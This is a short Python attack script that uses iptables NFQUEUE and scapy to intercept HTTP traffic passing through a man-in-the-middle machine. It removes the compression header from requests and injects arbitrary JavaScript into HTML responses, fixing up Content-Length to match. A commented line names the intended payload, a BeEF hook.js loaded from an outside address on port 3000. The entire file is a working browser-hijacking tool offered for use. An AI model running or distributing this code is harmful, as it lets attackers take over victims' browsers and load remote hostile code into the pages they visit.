import os
import netfilterqueue
import scapy.all as scapy
import re
import argparse


def get_args():
	parse = argparse.ArgumentParser()
	parse.add_argument('-js', '--jscode_file', help='The code to inject')
	args = parse.parse_args()
	f = open(args.jscode_file)
	js = f.read()
	return (js)

def set_load(packet,load):
	packet[scapy.Raw].load=load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet


def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.Raw):
		load=scapy_packet[scapy.Raw].load
     
		if scapy_packet[scapy.TCP].dport == 80:
			# print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)	
			# print(scapy_packet.show())
		
		elif scapy_packet[scapy.TCP].sport == 80:
			# print("[+] Response")
			# js = '<script src="http://10.0.2.31:3000/hook.js"></script>'
			load = scapy_packet[scapy.Raw].load.replace("</html>" , js + "</html>")
			content_lenght_search = re.search("(?:Content-Length:\s)(\d*)",load)
			if content_lenght_search and "text/html" in load:
				content_lenght = content_lenght_search.group(1)
				new_content_length = int(content_lenght) + len(js)
				load = load.replace(content_lenght, str(new_content_length))
				

		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
			print('[+] Injected')


	packet.accept()

try:
	js = get_args()
	# os.system('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0')
	# os.system('sudo iptables -I INPUT -j NFQUEUE --queue-num 0')
	print('***RUNNING*** sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
	os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
	queue=netfilterqueue.NetfilterQueue()
	queue.bind(0,process_packet)
	queue.run()
except KeyboardInterrupt:
	print('Flushing iptables ...')
	os.system('sudo iptables --flush')
